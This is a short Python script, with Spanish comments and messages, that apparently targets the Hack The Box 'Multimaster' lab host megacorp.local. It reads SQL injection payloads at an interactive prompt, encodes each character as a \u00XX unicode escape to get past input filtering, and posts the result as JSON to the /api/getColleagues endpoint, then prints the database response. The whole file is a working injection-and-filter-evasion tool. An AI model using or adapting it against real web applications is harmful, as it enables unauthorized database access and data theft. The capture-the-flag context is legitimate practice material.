#!/usr/bin/python3
import sys, signal, requests, json
def exit_handler(sig, frame):
	print("\n[!] Saliendo de la aplicacion...")
	sys.exit(1)
	
#evento para controlar la salida de la aplicacion con Ctrl+C
signal.signal(signal.SIGINT, exit_handler)

def convert_input():
    while True:
        output = input('MULTIMASTER> ').strip()
        if not output: continue

        if output.lower() == 'exit':
            break
        

        utf = [f"\\u00{ord(i):02x}" for i in output]

        data_post = ''.join(utf)
        print(f"[+] Convirtiendo payload: {data_post}")

        injection_sql(data_post)

def injection_sql(datos):
    print("[+] Injectando respuesta en la peticion web")
    base_url = 'http://megacorp.local/api/getColleagues'

    try:
        #data_json = '{"name":"' + datos + '"}'
        data_json = f'{{"name":"{datos}"}}'

        headers = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0",
            "Content-Type": "application/json;charset=utf-8",
        }

        response = requests.post(base_url, headers=headers, data=data_json)
        response.raise_for_status()

        print("[+] Peticion exitosa \n[+] Mostrando respuesta:")
        json_ordenado = json.loads(response.text)
        print(json.dumps(json_ordenado, indent=2, ensure_ascii=False))

    except requests.exceptions.RequestException as e:
         print(f"Ha habido un error en las peticiones HTML: {e}")
    except json.JSONDecodeError as e:
         print(f"Probablemente la respuesta no sea un JSON {e}")

if __name__ == '__main__':
    convert_input()

